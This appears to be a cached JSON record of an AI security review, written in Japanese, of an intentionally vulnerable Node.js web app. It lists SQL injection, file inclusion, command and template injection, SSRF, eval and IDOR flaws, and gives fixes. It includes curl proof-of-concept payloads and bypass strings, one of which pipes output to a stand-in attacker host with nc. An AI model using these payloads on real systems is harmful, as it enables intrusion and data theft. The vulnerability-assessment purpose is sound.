{
  "version": "1.0.0",
  "agent": "claude-code",
  "model": "claude-code",
  "prompt_hash": "9a0f09aad0e2e2cc8287febbf6e83f8b24d5b735b74b176c510051d96010abaf",
  "response": "{\"scratchpad\":\"複数の重大な脆弱性を検出。各エンドポイントを分析した結果：1) SQLインジェクション（/auth/login、/users/search、/documents/:id、/comments/create）- ユーザー入力が直接SQLクエリに埋め込まれている。2) ローカルファイルインクルージョン（/file/read、/documents/:id/content）- パス検証なしでファイルシステムアクセス。3) リモートコード実行（/system/execute）- ユーザー入力をexecSyncに直接渡す。4) SSRF（/ssrf/fetch、/scraper/url）- URLの検証なし。5) コマンドインジェクション（/system/execute）- 引数の結合で実行。6) テンプレートインジェクション（/template/handlebars、/template/ejs）- ユーザー入力がテンプレートとして実行。7) 非安全なデシリアライゼーション（/deserialize/eval）- evalの使用。8) IDOR（/user/:id、/logs/:user_id）- 認可チェックなし。9) ストアドXSS（/comments/create）- SQLインジェクション経由でコメント保存。\",\"analysis\":\"このアプリケーションは複数の重大なセキュリティ脆弱性を含んでいます。最も深刻な脆弱性はSQLインジェクション、リモートコード実行、ローカルファイルインクルージョンです。\\n\\n1. **SQLインジェクション（SQLI）**：/auth/login、/users/search、/documents/:id、/comments/createエンドポイントで、ユーザー入力がパラメータ化されていないSQL文字列に直接埋め込まれています。これにより、認証回避、データベース内容の抽出、データ改ざんが可能です。\\n\\n2. **ローカルファイルインクルージョン（LFI）**：/file/readエンドポイントでクエリパラメータとして渡されたパスの検証がなく、/etc/passwdなど任意のファイルにアクセス可能です。\\n\\n3. **リモートコード実行（RCE）**：/system/executeエンドポイントでexecSyncを使用し、ユーザー入力を直接コマンドに連結して実行可能です。\\n\\n4. **SSRF**：/ssrf/fetchと/scraper/urlで、ユーザーが指定したURLに対する検証がなく、内部ネットワークへのアクセスやメタデータサーバーへの攻撃が可能です。\\n\\n5. **テンプレートインジェクション**：handlebarsとejsテンプレートエンジンで、ユーザー入力がテンプレートパラメータとして処理され、コード実行につながります。\\n\\n6. **非安全なデシリアライゼーション**：evalを使用した直接的なコード実行は、任意のJavaScriptコード実行を許可します。\",\"poc\":\"【SQLインジェクション - 認証回避】\\ncurl -X POST http://localhost:3000/api/auth/login \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\\"username\\\": \\\"admin\\\\' OR 1=1 --\\\", \\\"password\\\": \\\"anything\\\"}'\\n\\n【ローカルファイルインクルージョン】\\ncurl 'http://localhost:3000/api/file/read?path=/etc/passwd'\\n\\n【コマンドインジェクション】\\ncurl -X POST http://localhost:3000/api/system/execute \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\\"command\\\": \\\"ls\\\", \\\"args\\\": [\\\"|\\\", \\\"cat\\\", \\\"/etc/passwd\\\"]}'\\n\\n【テンプレートインジェクション（Handlebars）】\\ncurl -X POST http://localhost:3000/api/template/handlebars \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\\"template\\\": \\\"{{#with (function(){return this})()}}{{#each (keys)}}{{@key}}{{/each}}{{/with}}\\\"}'\\n\\n【非安全なデシリアライゼーション】\\ncurl -X POST http://localhost:3000/api/deserialize/eval \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\\"serialized\\\": \\\"(function(){require(\\\\\\\"child_process\\\\\\\").execSync(\\\\\\\"id\\\\\\\")})()\\\"}'\\n\\n【IDOR - 他ユーザー情報アクセス】\\ncurl 'http://localhost:3000/api/user/2'\\ncurl 'http://localhost:3000/api/logs/999'\\n\\n【SSRF】\\ncurl -X POST http://localhost:3000/api/ssrf/fetch \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\\"url\\\": \\\"http://169.254.169.254/latest/meta-data/\\\"}'\",\"confidence_score\":100,\"vulnerability_types\":[\"SQLI\",\"LFI\",\"RCE\",\"SSRF\",\"XSS\",\"IDOR\",\"AFO\"],\"par_analysis\":{\"principals\":[{\"identifier\":\"req.body.username / req.body.password\",\"trust_level\":\"untrusted\",\"source_context\":\"ログインエンドポイントのユーザー入力（/auth/login）\",\"risk_factors\":[\"ユーザーからの直接入力\",\"検証・サニタイゼーション無し\",\"ログに平文で記録\",\"エラーメッセージに反映\"]},{\"identifier\":\"req.params.id\",\"trust_level\":\"untrusted\",\"source_context\":\"URLパラメータ（/user/:id、/documents/:id、/logs/:user_id）\",\"risk_factors\":[\"型チェックなし\",\"範囲検証なし\",\"認可チェックなし\",\"直接SQL文に埋め込み\"]},{\"identifier\":\"req.query.path / req.query.dir\",\"trust_level\":\"untrusted\",\"source_context\":\"ファイル操作エンドポイントのクエリパラメータ（/file/read、/file/list）\",\"risk_factors\":[\"パストラバーサル検証なし\",\"ホワイトリスト未実装\",\"相対パス許可\",\"パス正規化なし\"]},{\"identifier\":\"req.body.command / req.body.args\",\"trust_level\":\"untrusted\",\"source_context\":\"/system/executeエンドポイント\",\"risk_factors\":[\"シェルメタキャラクタの過濾なし\",\"引数配列の結合で実行\",\"子プロセス生成\",\"シェルコンテキストで実行\"]},{\"identifier\":\"req.body.url\",\"trust_level\":\"untrusted\",\"source_context\":\"SSRF系エンドポイント（/ssrf/fetch、/scraper/url）\",\"risk_factors\":[\"URLスキーム検証なし\",\"ホスト名ホワイトリストなし\",\"内部ネットワークアクセス可能\",\"タイムアウトのみで保護\"]},{\"identifier\":\"req.body.template\",\"trust_level\":\"untrusted\",\"source_context\":\"テンプレート処理エンドポイント（/template/handlebars、/template/ejs）\",\"risk_factors\":[\"テンプレート入力の検証なし\",\"サンドボックス化なし\",\"コンパイル直後に実行\",\"ヘルパー関数にアクセス可能\"]},{\"identifier\":\"req.body.content / req.body.author\",\"trust_level\":\"untrusted\",\"source_context\":\"/comments/createエンドポイント\",\"risk_factors\":[\"HTML/スクリプトの過濾なし\",\"SQL文字列に直接埋め込み\",\"保存されたXSSリスク\",\"エスケープ処理なし\"]},{\"identifier\":\"req.body.serialized\",\"trust_level\":\"untrusted\",\"source_context\":\"/deserialize/evalエンドポイント\",\"risk_factors\":[\"evalによる直接実行\",\"入力の検証なし\",\"任意のJavaScriptコード実行可能\",\"プロトタイプ汚染も可能\"]},{\"identifier\":\"req.file.originalname / req.file.path\",\"trust_level\":\"untrusted\",\"source_context\":\"ファイルアップロード（/file/upload）\",\"risk_factors\":[\"ファイル名の検証なし\",\"パストトラバーサル可能\",\"ファイルタイプ確認なし\",\"実行可能ファイル配置可能\"]}],\"actions\":[{\"identifier\":\"SQL文字列結合（テンプレートリテラル）\",\"security_function\":\"SQLインジェクション攻撃を防止し、入力を安全に処理すべき\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"パラメータ化クエリ（プリペアドステートメント）未使用\",\"ユーザー入力が直接SQL文に埋め込まれ\",\"複数箇所で同じパターンが繰り返される（lines 47, 69, 100, 122, 126, 130, 150, 169, 453, 469）\",\"エラーメッセージでクエリが露出\"],\"bypass_vectors\":[\"シングルクォート（'）で文字列終了\",\"SQL論理演算子（OR 1=1、AND、UNION）を組み込み\",\"コメント記号（--、#）で後続SQL無効化\",\"時間ベースのブラインドインジェクション\"]},{\"identifier\":\"ファイルパス検証なし（fs.readFileSync）\",\"security_function\":\"パストトラバーサル攻撃を防止し、許可されたディレクトリのみアクセス\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"ホワイトリスト未実装\",\"相対パス（../）のフィルタリング欠如\",\"シンボリックリンク対策なし\",\"ベースディレクトリの制限なし\"],\"bypass_vectors\":[\"パストトラバーサル：/file/read?path=../../../../etc/passwd\",\"エンコーディング：/file/read?path=%2e%2e%2fetc%2fpasswd\",\"シンボリックリンク利用\",\"null終端文字利用（低バージョン環境）\"]},{\"identifier\":\"execSyncの安全でない使用\",\"security_function\":\"コマンドインジェクションを防止し、入力を適切にエスケープ\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"引数配列を文字列に結合（line 323）\",\"シェルメタキャラクタの過濾なし\",\"子プロセスがシェルコンテキストで実行\",\"引数の引用符処理なし\"],\"bypass_vectors\":[\"セミコロンでコマンド連結：command; cat /etc/passwd\",\"パイプ：command | nc attacker.com 1234\",\"バックティック：command `whoami`\",\"$(...)構文：command $(id)\"]},{\"identifier\":\"URL検証なし（axios.get）\",\"security_function\":\"SSRF攻撃を防止し、内部ネットワークアクセスを制限\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"スキーム検証なし（file://、gopher://対応可能）\",\"ホスト名ホワイトリスト未実装\",\"内部IP範囲（169.254.0.0/16、10.0.0.0/8等）チェック欠如\",\"タイムアウト（5000ms）のみが保護機構\"],\"bypass_vectors\":[\"メタデータサーバー：http://169.254.169.254/latest/meta-data/\",\"ローカルホスト：http://localhost:9200（内部Elasticsearch等）\",\"内部サービス：http://internal-api.example.com/admin\",\"リダイレクト利用：外部サイトからメタデータサーバーへリダイレクト\"]},{\"identifier\":\"テンプレートコンパイル・実行\",\"security_function\":\"テンプレートインジェクションを防止し、ユーザー入力をテンプレートとしない\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"ユーザー入力がテンプレートそのものとして処理（line 257、271）\",\"コンテキスト検証なし\",\"ヘルパー関数へのアクセス制限なし\",\"require/importの実行可能\"],\"bypass_vectors\":[\"handlebars内での関数呼び出し：{{#with (function(){...})()}}\",\"EJSでのJavaScript実行：<%= require('child_process').execSync('id') %>\",\"プロトタイプチェーン操作：{{this.constructor}}\"]},{\"identifier\":\"eval()による実行\",\"security_function\":\"デシリアライゼーション時に安全な方法を使用し、evalを避ける\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"evalの直接使用（line 428）\",\"入力の型チェックなし\",\"サンドボックス化なし\",\"任意のJavaScriptコード実行可能\"],\"bypass_vectors\":[\"関数式：(function(){require('child_process').execSync('cat /etc/passwd')})()\",\"プロトタイプ汚染：({__proto__: {polluted: true}})\",\"グローバルアクセス：(this.process.mainModule.require('child_process'))\"]},{\"identifier\":\"認可チェック欠如（URLパラメータによるリソース直接参照）\",\"security_function\":\"他ユーザーのリソースアクセスを防止し、認可を実施\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"/user/:id、/logs/:user_idで認証状態のチェックのみ\",\"現在のユーザーIDとリクエストパラメータの照合なし\",\"認可ロジック完全欠落\",\"全ユーザーのデータにアクセス可能\"],\"bypass_vectors\":[\"任意のユーザーIDを指定：/api/user/999で存在する全ユーザー取得可能\",\"ログ情報取得：/api/logs/1で全ユーザーのログ閲覧可能\",\"総当たり：1から順に全ユーザーデータを列挙\"]},{\"identifier\":\"XSS対策なし（コメント保存）\",\"security_function\":\"ユーザー入力をHTMLエスケープし、ストアドXSSを防止\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"ユーザー入力をそのままDBに保存（line 469）\",\"SQLインジェクションも併存\",\"レスポンス返却時のHTMLエスケープなし\",\"/commentsエンドポイント（line 484）で未エスケープ状態で返却\"],\"bypass_vectors\":[\"HTMLタグ：<script>alert('XSS')</script>\",\"イベントハンドラ：<img src=x onerror=\\\"alert('XSS')\\\">\",\"SVG攻撃：<svg onload=\\\"alert('XSS')\\\">\",\"HTMLエンティティ回避：&#60;script&#62;\"]}],\"resources\":[{\"identifier\":\"SQLiteデータベース（enterprise_data.db）\",\"sensitivity_level\":\"critical\",\"operation_type\":\"データベースクエリ実行（SELECT、INSERT）\",\"protection_mechanisms\":[\"データベース接続のみ（認証情報未確認）\",\"トランザクション管理なし\",\"クエリロギングなし\",\"入力検証・パラメータ化クエリなし\"]},{\"identifier\":\"ファイルシステム（fs.readFileSync、fs.readdirSync）\",\"sensitivity_level\":\"critical\",\"operation_type\":\"ファイル読み取り、ディレクトリリスト取得\",\"protection_mechanisms\":[\"エラーハンドリング実装\",\"パスの検証・制限なし\",\"ファイルアクセス権限に依存\",\"読み取り範囲制限なし\"]},{\"identifier\":\"プロセス実行（execSync）\",\"sensitivity_level\":\"critical\",\"operation_type\":\"システムコマンド実行\",\"protection_mechanisms\":[\"タイムアウト設定（5000ms）\",\"シェルコンテキスト実行（危険）\",\"入力検証なし\",\"実行権限制限なし\"]},{\"identifier\":\"ネットワーク通信（axios.get）\",\"sensitivity_level\":\"high\",\"operation_type\":\"外部URLへのHTTPリクエスト\",\"protection_mechanisms\":[\"タイムアウト設定（5000ms）\",\"レスポンスサイズ制限なし\",\"スキーム検証なし\",\"内部ネットワークアクセス制限なし\"]},{\"identifier\":\"テンプレートエンジン（Handlebars、EJS）\",\"sensitivity_level\":\"critical\",\"operation_type\":\"ユーザー入力テンプレートのコンパイル・実行\",\"protection_mechanisms\":[\"コンテキスト渡し\",\"テンプレート入力検証なし\",\"サンドボックス化なし\",\"ヘルパー関数アクセス制限なし\"]},{\"identifier\":\"JavaScriptランタイム（eval）\",\"sensitivity_level\":\"critical\",\"operation_type\":\"任意コード実行\",\"protection_mechanisms\":[\"エラーハンドリング実装\",\"入力検証なし\",\"実行コンテキスト制限なし\",\"保護機構なし\"]},{\"identifier\":\"JWT生成・検証\",\"sensitivity_level\":\"high\",\"operation_type\":\"認証トークン処理\",\"protection_mechanisms\":[\"HS256署名使用\",\"秘密鍵がソースコード内に存在（line 30：'super_secret_js_key_123'）\",\"API キーがレスポンスに含まれ\"]},{\"identifier\":\"ファイルアップロード・抽出\",\"sensitivity_level\":\"high\",\"operation_type\":\"ユーザー提供ファイルの保存・展開\",\"protection_mechanisms\":[\"マルチャー未実装（コメント参照：line 367）\",\"ファイル名検証なし\",\"アーカイブ内部検証なし\",\"パストトラバーサル対策なし\"]}],\"policy_violations\":[{\"rule_id\":\"SQLI-001\",\"rule_description\":\"SQLクエリパラメータは必ずプリペアドステートメント（パラメータ化クエリ）を使用し、ユーザー入力を直接文字列結合してはならない\",\"violation_path\":\"Principal: req.body.username/password/docId/q/role/limit → Action: テンプレートリテラルでSQL文字列構築 → Resource: SQLiteデータベース実行\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"LFI-001\",\"rule_description\":\"ファイルパスはホワイトリストで制限し、相対パスやパストトラバーサルシーケンスを検証・拒否すべき\",\"violation_path\":\"Principal: req.query.path/dir → Action: パス検証なし → Resource: fs.readFileSync/readdirSync\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"RCE-001\",\"rule_description\":\"execSync等のプロセス実行関数は、ユーザー入力を直接コマンドに渡してはならず、配列形式で個別引数を指定すべき\",\"violation_path\":\"Principal: req.body.command/args → Action: 文字列連結後execSync → Resource: システムコマンド実行\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"SSRF-001\",\"rule_description\":\"外部URLへのリクエストは、スキーム・ホスト名・ポート番号をホワイトリストで制限すべき。内部IP範囲（169.254.0.0/16、10.0.0.0/8、172.16.0.0/12、127.0.0.0/8等）へのアクセスを拒否すべき\",\"violation_path\":\"Principal: req.body.url → Action: スキーム・ホスト検証なし → Resource: axios.get（外部ネットワークアクセス）\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"TPLI-001\",\"rule_description\":\"テンプレートエンジンで処理するテンプレートは信頼できるソースのみとし、ユーザー入力をテンプレート入力として使用すべきでない。サンドボックス化またはユーザー入力をデータのみに限定\",\"violation_path\":\"Principal: req.body.template → Action: handlebars.compile/ejs.render → Resource: テンプレート実行\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"EVAL-001\",\"rule_description\":\"eval()は使用禁止。デシリアライゼーション時はJSON.parseまたは厳格なデシリアライザを使用すべき\",\"violation_path\":\"Principal: req.body.serialized → Action: eval()直接実行 → Resource: JavaScriptランタイム\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"IDOR-001\",\"rule_description\":\"URLパラメータで指定されたリソースにアクセスする前に、現在のユーザーが該当リソースへアクセス権を保有することを検証すべき\",\"violation_path\":\"Principal: req.params.id（認証ユーザーが指定） → Action: 認可チェック欠落 → Resource: usersテーブル・audit_logsテーブルレコード\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"XSS-001\",\"rule_description\":\"ユーザー入力をHTMLコンテキストに出力する前に、HTMLエスケープすべき。データベース保存時もエスケープまたはパラメータ化を行い、レスポンス返却時にも再度エスケープ\",\"violation_path\":\"Principal: req.body.content/author → Action: SQLインジェクション+エスケープなし → Resource: commentsテーブル/JSONレスポンス\",\"severity\":\"high\",\"confidence\":1.0},{\"rule_id\":\"AUTH-001\",\"rule_description\":\"認証用シークレット（JWT_SECRET、パスワード）をソースコード内に埋め込むべきでない。環境変数等から読み込むべき\",\"violation_path\":\"Principal: ハードコードされた秘密鍵 → Action: ソースコード管理に含まれる → Resource: JWTトークン生成・検証\",\"severity\":\"high\",\"confidence\":1.0},{\"rule_id\":\"INFO-001\",\"rule_description\":\"エラーメッセージにはSQLクエリやシステム詳細情報を含めるべきでない。開発時と本番環境で異なるメッセージを表示すべき\",\"violation_path\":\"Principal: エラーが発生 → Action: queryをレスポンスに含める → Resource: JSONレスポンス（攻撃者に情報開示）\",\"severity\":\"medium\",\"confidence\":1.0}]},\"remediation_guidance\":{\"policy_enforcement\":[{\"component\":\"全SQLクエリ処理\",\"required_improvement\":\"プリペアドステートメント（パラメータ化クエリ）を使用\",\"specific_guidance\":\"sqlite3ライブラリの場合、`db.prepare(query).run(username, password)`等で値をバインドする。テンプレートリテラルやstr.format()は使用禁止。具体例：\\nconst query = `SELECT * FROM users WHERE username = ? AND password = ?`;\\ndb.get(query, [username, password], callback);\",\"priority\":\"critical\"},{\"component\":\"/file/readエンドポイント\",\"required_improvement\":\"ファイルパスの厳密なバリデーション\",\"specific_guidance\":\"ホワイトリストベースのアプローチを実装。許可されたディレクトリを定義し、path.normalize()で正規化してからパス検証を行う。相対パス（../）を含む場合は拒否。具体例：\\nconst allowedDir = '/var/data/documents';\\nconst normalizedPath = path.normalize(filePath);\\nif (!normalizedPath.startsWith(allowedDir)) reject();\",\"priority\":\"critical\"},{\"component\":\"/system/executeエンドポイント\",\"required_improvement\":\"コマンド実行を配列引数で指定、またはホワイトリスト化\",\"specific_guidance\":\"execSync()を使用しない。child_process.execFile()で配列形式の引数を使用：\\nconst { execFile } = require('child_process');\\nexecFile('ls', ['-la', dir], callback);  // シェルメタキャラクタ解釈されない\",\"priority\":\"critical\"},{\"component\":\"/ssrf/fetchと/scraper/urlエンドポイント\",\"required_improvement\":\"URLのスキーム・ホスト・ポート検証\",\"specific_guidance\":\"URLをurl.parse()で解析し、スキーム（http/https）を限定。ホスト名を逆引きしてIPを確認し、内部範囲（169.254.0.0/16、10.0.0.0/8、172.16.0.0/12、127.0.0.0/8、localhost）を拒否。具体例：\\nconst urlObj = new URL(url);\\nif (!['http:', 'https:'].includes(urlObj.protocol)) reject();\\nif (isPrivateIP(urlObj.hostname)) reject();\",\"priority\":\"critical\"},{\"component\":\"/template/*エンドポイント\",\"required_improvement\":\"テンプレートエンジンの使用廃止またはサンドボックス化\",\"specific_guidance\":\"ユーザー入力をテンプレートパラメータとしない。ユーザー入力はデータのみとして扱う。\\n代替案：事前定義されたテンプレートに対してのみコンテキスト変数を適用。または、セキュアなテンプレートエンジン（Nunjucks with autoescape設定等）を使用。\",\"priority\":\"critical\"},{\"component\":\"/deserialize/evalエンドポイント\",\"required_improvement\":\"eval()を削除し、JSON.parseを使用\",\"specific_guidance\":\"eval()を完全に廃止。JSON形式のデータ転送のみ対応。\\nconst deserialized = JSON.parse(serialized);\",\"priority\":\"critical\"},{\"component\":\"/user/:id、/logs/:user_idエンドポイント\",\"required_improvement\":\"認可ロジック実装\",\"specific_guidance\":\"現在のユーザーのIDを取得（JWTトークンから抽出等）し、リクエストパラメータと照合。一致しない場合は403を返す。例：\\nif (decoded.user_id !== parseInt(userId)) return res.status(403).json({error: 'Forbidden'});\",\"priority\":\"critical\"},{\"component\":\"/comments/createエンドポイント\",\"required_improvement\":\"HTMLエスケープとSQLインジェクション対策\",\"specific_guidance\":\"SQLはプリペアドステートメントを使用。HTMLレスポンス時はescape-html等を使用：\\nconst escapeHtml = require('escape-html');\\nres.json({ comments: comments.map(c => ({...c, content: escapeHtml(c.content)}))});\",\"priority\":\"critical\"},{\"component\":\"ソースコード管理\",\"required_improvement\":\"秘密情報を環境変数に移動\",\"specific_guidance\":\"JWT_SECRET、API_KEYSをソースコードから削除し、環境変数から読み込む：\\nconst JWT_SECRET = process.env.JWT_SECRET;\",\"priority\":\"high\"},{\"component\":\"エラーハンドリング\",\"required_improvement\":\"本番環境でのエラー詳細情報を非表示化\",\"specific_guidance\":\"開発環境ではログに出力、本番環境では汎用エラーメッセージを返す。SQLクエリをレスポンスに含めない。\\nconst isDev = process.env.NODE_ENV === 'development';\\nres.status(500).json(isDev ? {error: err.message, query} : {error: 'Internal Server Error'});\",\"priority\":\"medium\"}]},\"file_path\":null,\"pattern_description\":null,\"matched_source_code\":null}",
  "metadata": {
    "created_at": "2025-12-30T16:37:46.238486Z",
    "last_accessed": "2025-12-30T16:37:46.238486Z",
    "access_count": 0,
    "prompt_size": 19889,
    "response_size": 23882
  }
}